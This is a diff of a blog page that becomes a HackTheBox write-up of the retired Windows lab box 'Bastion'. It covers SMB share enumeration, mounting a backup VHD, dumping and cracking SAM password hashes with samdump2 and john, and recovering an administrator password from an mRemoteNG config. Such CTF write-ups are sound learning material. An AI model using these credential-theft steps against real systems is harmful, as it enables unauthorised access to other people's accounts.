@@ -10,33 +10,29 @@
     <meta name="generator" content="After Dark Hugo">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tags | theyknow</title>
-    <meta name="description" content="">
-    <meta name="keywords" content="post, tools, ">
+    <title>HTB Write-up: Bastion | theyknow</title>
+    <meta name="description" content="Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box.">
+    <meta name="keywords" content="htb, ctf, windows, smb, nRemoteNG, john">
     
     
     
     
-      <meta name="robots" content="noindex">
-    
-    <meta property="og:title" content="Tags" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://domain.example/tags/" />
+    <meta property="og:title" content="HTB Write-up: Bastion" />
+<meta property="og:description" content="Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://domain.example/post/bastion/" />
 
-<meta property="og:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg" />
-
-<meta property="og:updated_time" content="2019-09-08T12:40:00+02:00" />
+<meta property="og:image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png" />
+<meta property="article:published_time" content="2019-09-08T12:40:00+02:00" />
+<meta property="article:modified_time" content="2019-09-08T12:40:00+02:00" />
 
     <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg"/>
+<meta name="twitter:image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png"/>
 
-<meta name="twitter:title" content="Tags"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:title" content="HTB Write-up: Bastion"/>
+<meta name="twitter:description" content="Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box."/>
 
     
-
-  <meta property="og:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg">
 
 
 
@@ -93,9 +89,7 @@ fetchInject(["/js/lazysizes.min.js"]);
 
 
     
-      <link rel="alternate" type="application/rss+xml" href="https://domain.example/tags/index.xml" title="theyknow">
-    
-    <link rel="canonical" href="https://domain.example/tags/">
+    <link rel="canonical" href="https://domain.example/post/bastion/">
     
     
     <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
@@ -202,7 +196,7 @@ a[itemprop="url"]:hover {
     
       
       
-        <a itemprop="url" href="/post">Posts</a>
+        <a itemprop="url" class="active" href="/post">Posts</a>
       
     
       
@@ -234,64 +228,338 @@ a[itemprop="url"]:hover {
 
 </header>
     <main>
-  <header>
-    <h1>Tags</h1>
-  </header>
-  <ul>
+  
     
-      <li><a href="bruteforce">bruteforce</a> (1)
+      <style>{{ -}}.hack header figure[itemtype*=ImageObject]{position:relative}.hack header figure[itemtype*=ImageObject] figcaption{position:absolute;bottom:0;right:0;text-align:right;padding:15px;font-style:oblique;font-size:smaller;mix-blend-mode:soft-light}.hack header figure[itemtype*=ImageObject] [itemprop=headline]{font-weight:700}</style>
     
-      <li><a href="crypto">crypto</a> (2)
+  
+  <article itemscope itemtype="https://schema.org/BlogPosting">
+    <meta itemprop="name" content="HTB Write-up: Bastion">
+<meta itemprop="description" content="Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box.">
+
+
+<meta itemprop="datePublished" content="2019-09-08T12:40:00&#43;02:00" />
+<meta itemprop="dateModified" content="2019-09-08T12:40:00&#43;02:00" />
+<meta itemprop="wordCount" content="848">
+
+  <meta itemprop="image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png">
+
+
+
+<meta itemprop="keywords" content="htb,ctf,windows,smb,nRemoteNG,john," />
+
+    <header>
+      <h1 itemprop="headline name">HTB Write-up: Bastion</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>4 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2019-09-08T12:40:00&#43;02:00">8 Sep, 2019</time>
+
+
+      </p>
+      
+        <blockquote itemprop="description">Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box.</blockquote>
+      
+      
+
+
+
+    </header>
     
-      <li><a href="ctf">ctf</a> (5)
-    
-      <li><a href="enumaration">enumaration</a> (1)
-    
-      <li><a href="enumeration">enumeration</a> (1)
-    
-      <li><a href="forensic">forensic</a> (4)
-    
-      <li><a href="htb">htb</a> (1)
-    
-      <li><a href="i18">i18</a> (2)
-    
-      <li><a href="john">john</a> (2)
-    
-      <li><a href="linenum">linenum</a> (1)
-    
-      <li><a href="linux">linux</a> (1)
-    
-      <li><a href="malware">malware</a> (1)
-    
-      <li><a href="nremoteng">nremoteng</a> (1)
-    
-      <li><a href="nslookup">nslookup</a> (1)
-    
-      <li><a href="pentest">pentest</a> (1)
-    
-      <li><a href="privesc">privesc</a> (2)
-    
-      <li><a href="pspy">pspy</a> (1)
-    
-      <li><a href="re">re</a> (1)
-    
-      <li><a href="reverse">reverse</a> (1)
-    
-      <li><a href="smb">smb</a> (1)
-    
-      <li><a href="traffic-analysis">traffic-analysis</a> (1)
-    
-      <li><a href="web">web</a> (3)
-    
-      <li><a href="windows">windows</a> (2)
-    
-      <li><a href="wireshark">wireshark</a> (2)
-    
-  </ul>
-</main>
+
+    <div itemprop="articleBody">
+      
+
+<p>The Bastion Windows box retired this weekend on <a  target="_blank" rel="external noopener" href="https://www.hackthebox.eu/">HackTheBox</a>. It was a Windows box, quite easy to solve but learned a lot along the way. It&rsquo;s my first write-up of a HTB box so it might not be the best but hopefully it will be a nice summary! We learn about SMB, mounting VHD in Linux, stealing Windows hashes, cracking them with John, and exploiting a program for Privesc.</p>
+
+<p><img src="/bastion.png" alt="Bastion badge" /></p>
+
+<h2 id="1-recon">1: Recon</h2>
+
+<p>First, I do the usual nmap scan I start with on all boxes:
+
+
+
+
+<div class="alert alert-info">
+  
+nmap -A -oN nmap-bastion.txt 10.10.10.134<br>
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-20 08:43 GMT<br>
+Nmap scan report for 10.10.10.134<br>
+Host is up (0.34s latency).<br>
+Not shown: 996 closed ports<br>
+PORT    STATE SERVICE      VERSION<br>
+22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)<br>
+| ssh-hostkey: <br>
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)<br>
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)<br>
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)<br>
+135/tcp open  msrpc        Microsoft Windows RPC<br>
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br>
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds<br>
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br>
+<br>
+Host script results:<br>
+|_clock-skew: mean: -40m01s, deviation: 1h09m15s, median: -2s<br>
+| smb-os-discovery: <br>
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>
+|   Computer name: Bastion<br>
+|   NetBIOS computer name: BASTION\x00<br>
+|   Workgroup: WORKGROUP\x00<br>
+|_  System time: 2019-07-20T10:43:23+02:00<br>
+| smb-security-mode: <br>
+|   account_used: guest<br>
+|   authentication_level: user<br>
+|   challenge_response: supported<br>
+|_  message_signing: disabled (dangerous, but default)<br>
+| smb2-security-mode: <br>
+|   2.02: <br>
+|_    Message signing enabled but not required<br>
+| smb2-time: <br>
+|   date: 2019-07-20 08:43:22<br>
+|_  start_date: 2019-07-20 02:31:48
+
+</div>
+
+</p>
+
+<p>The open ports are not too exciting but we&rsquo;ve got SMB, so let&rsquo;s see if we can exploit it.
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# smbclient -L //10.10.10.134<br>
+Enter WORKGROUP\Root's password: <br>
+<br>
+	Sharename       Type      Comment<br>
+	---------       ----      -------<br>
+	ADMIN$          Disk      Remote Admin<br>
+	Backups         Disk      <br>
+	C$              Disk      Default share<br>
+	IPC$            IPC       Remote IPC<br>
+Reconnecting with SMB1 for workgroup listing.<br>
+do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>
+Failed to connect with SMB1 -- no workgroup available
+
+</div>
+
+</p>
+
+<p>Alright, now we can access Backups by using Null session:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# smbclient //10.10.10.134/backups<br>
+Enter WORKGROUP\'s password:<br>
+Try "help" to get a list of possible commands.<br>
+smb: \> l<br>
+  .                                   D        0  Fri Sep  6 13:39:45 2019<br>
+  ..                                  D        0  Fri Sep  6 13:39:45 2019<br>
+  note.txt                           AR      116  Tue Apr 16 12:10:09 2019<br>
+  pFESbxwaWT                          D        0  Fri Sep  6 13:39:45 2019<br>
+  SDT65CB.tmp                         A        0  Fri Feb 22 14:43:08 2019<br>
+  WindowsImageBackup                  D        0  Fri Feb 22 14:44:02 2019<br>
+<br>
+                7735807 blocks of size 4096. 2759330 blocks available
+
+</div>
+
+</p>
+
+<p>I found note.txt but nothing interesting there. But there is a directory called WindowsImageBackup!</p>
+
+<p><br></p>
+
+<h2 id="2-mounting-the-vhd-to-get-user">2: Mounting the VHD to get user</h2>
+
+<p>In the WindowsImageBackup we find 2 VHD files:
+
+
+
+
+<div class="alert alert-info">
+  
+9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 14:44:03 2019<br>
+9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 14:45:32 2019
+
+</div>
+
+</p>
+
+<p>They are big files so we want to avoid downloading them. After a LOT of googling and every more failed attempts, I found the way to mount VHD files in linux. First I needed to install <a  target="_blank" rel="external noopener" href="https://www.varonis.com/blog/cifs-vs-smb/">CIFS</a>:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# sudo apt-get install cifs-utils<br>
+
+</div>
+
+</p>
+
+<p>The first and smaller VHD didn&rsquo;t contain anything of interest so let&rsquo;s go straight to the second one:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# mount.cifs //10.10.10.134/Backups ./mount<br>
+root@kali:~/Desktop/HTB/Bastion# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro ~/Desktop/HackTheBox/Bastion/vhd-mount2 -m /dev/sda1
+
+</div>
+
+</p>
+
+<p>Wait a few seconds and the VHD should appear as a mounted folder in your system now! I checked the Users folder but nothing there which means there is another step to getting user.txt. After getting back to more googling, I found some info about extracting the hashes in a Windows backup in /System32/config by using <a  target="_blank" rel="external noopener" href="https://linux.die.net/man/1/samdump2">samdump2</a>:
+
+
+
+
+<div class="alert alert-info">
+  
+samdump2 SYSTEM SAM<br>
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+
+</div>
+
+</p>
+
+<p>I saved the hash in a txt file to crack it with john:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash.txt<br>
+Using default input encoding: UTF-8<br>
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])<br>
+Warning: no OpenMP support for this hash type, consider --fork=3<br>
+Press 'q' or Ctrl-C to abort, almost any other key for status<br>
+bureaulampje     (L4mpje)<br>
+1g 0:00:00:05 DONE (2019-07-20 12:55) 0.1709g/s 1606Kp/s 1606Kc/s 1606KC/s burg772v..burdy1<br>
+Use the "--show --format=NT" options to display all of the cracked passwords reliably<br>
+Session completed
+
+</div>
+
+</p>
+
+<p>Awesome I got the password &ldquo;bureaulampje&rdquo;! I know SSH is available on this box from the nmap scan:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# ssh L4mpje@10.10.10.134
+
+</div>
+
+</p>
+
+<p>And I find the user.txt on the Desktop of the machine!</p>
+
+<p><br></p>
+
+<h2 id="3-priviledge-escalation">3: Priviledge Escalation</h2>
+
+<p>I did a lot of enumeration suggested on different Windows privesc guides, and finally found a weird program sitting in Program Files called nRemoteNG. A quick google search shows that it is vulnerable and can get us admin password: <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">http://hackersvanguard.com/mremoteng-insecure-password-storage/</a></p>
+
+<p>I download nRemoteNG on my Windows VM. I used <a  target="_blank" rel="external noopener" href="https://winscp.net/eng/index.php">WinSCP</a> to access C:\Users\L4mpje\AppData\Roaming\mRemoteNG and download consConf.xml on my VM. Then I import it on nRemoteNG and to see the clear text of a given password, go to “Tools” &gt; “External Tools”. Then right-click in the white space and choose “New External Tool”. Next, in the External Tools Properties, fill in a “Display Name”, “Filename” and some “arguments”, with “Password lookup”, CMD and “/k echo %password%” respectively.</p>
+
+<p><img src="/nremoteng.png" alt="nRemoteNG screenshot" /></p>
+
+<p>Then right click on the Bastion connection, external tool, Password Lookup, and we get the Admin password. We can now SSH with Administrator and get the root flag!
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Desktop/HTB/Bastion# ssh Administrator@10.10.10.134<br>
+
+</div>
+
+</p>
+
+<p><img src="/masterhack.gif" alt="Master hacker gif" /></p>
+
+    </div>
     <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">theyknow</span>
+    
+  
+  <time itemprop="datePublished" datetime="2019-09-08T12:40:00&#43;02:00">
+    8 Sep, 2019
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/post/">post</a></span>
+  
+  
+    and tagged <a rel="tag" href="/tags/ctf/">ctf</a>, <a rel="tag" href="/tags/htb/">htb</a>, <a rel="tag" href="/tags/john/">john</a>, <a rel="tag" href="/tags/nremoteng/">nRemoteNG</a>, <a rel="tag" href="/tags/smb/">smb</a> and <a rel="tag" href="/tags/windows/">windows</a>
+  
+  using <span itemprop="wordCount">848</span> words.
+</p>
+
+      
+
+
+
+  
+    <aside>
+      <header>Related Content</header>
+      
+        <ul>
+          
+            <li><a href="/post/i18-1/">i18 Challenge - Part 1</a>
+            <time class="muted" datetime="5M">5 minutes</time>
+          
+            <li><a href="/tools/pentest/">Pentesting tools</a>
+            <time class="muted" datetime="8M">8 minutes</time>
+          
+            <li><a href="/post/upload-tools/">Upload enumeration tools to a linux server</a>
+            <time class="muted" datetime="3M">3 minutes</time>
+          
+            <li><a href="/post/i18-2/">i18 Challenge - Part 2</a>
+            <time class="muted" datetime="4M">4 minutes</time>
+          
+        </ul>
+      
+    </aside>
   
 
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  <small class="muted">
+    
+
+  </small>
 </footer>
     
     
